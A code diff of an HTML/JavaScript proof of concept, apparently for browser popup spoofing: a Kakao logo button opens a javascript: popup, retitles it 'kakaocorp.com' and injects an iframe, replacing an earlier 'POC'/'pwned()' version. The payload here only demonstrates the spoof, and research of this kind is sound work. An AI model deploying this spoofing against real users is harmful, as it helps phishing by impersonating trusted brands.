@@ -1,9 +1,22 @@
+
+
+<img id="button" src="https://t1.kakaocdn.net/kakaocorp/corp_thumbnail/Kakao.png">
+
+
 <script>
-    window.onclick = function () {
-        x = window.open('https://anything.com');
-        setTimeout(function () {
-            x.document.write(`<h1>POC</h1>`)
-        }, 1);
-    }
-    </script>
-<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
+var s="https://kakaocorp.com";
+var button=document.getElementById("button");
+button.href=s;
+var qwin;
+button.onclick=function(e){
+
+	qwin=open('javascript:alert(1)',"toolbar=no,height=350,width=305");
+	setTimeout(function(){
+		qwin.document.title=s;
+		qwin.document.body.innerHTML=`<iframe src=https://google.com>
+		
+		`;
+		
+	},333)
+return false;}
+</script>
